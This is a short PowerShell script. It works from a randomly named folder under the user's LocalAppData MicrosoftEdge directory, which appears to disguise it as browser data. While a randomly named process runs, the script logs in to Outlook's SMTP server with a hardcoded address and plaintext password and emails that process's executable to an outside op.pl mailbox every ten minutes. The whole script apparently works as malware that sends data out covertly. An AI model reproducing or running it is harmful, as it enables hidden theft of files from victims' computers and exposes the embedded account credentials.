Set-Location $env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\
while (Get-Process -Name "ygoLa8SyqmQTGsoh" -ErrorAction SilentlyContinue)
{
    $Username = "jankowalski69zs@outlook.com"
    $Password = ConvertTo-SecureString "JanKowalski1" -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($Username,$Password)
    $From = "jankowalski69zs@outlook.com"
    $To = "resultsiliketowatch@op.pl"
    $Subject = "Email with Attachment"
    $Body = "This is an email with an attachment."
    $Attachment = ".\ygoLa8SyqmQTGsoh.exe"
    Send-MailMessage -SmtpServer "smtp-mail.outlook.com" -UseSsl -Port 587 -Credential $Credential -From $From -To $To -Subject $Subject -Body $Body -Attachments $Attachment
    Start-Sleep -Seconds 600
}
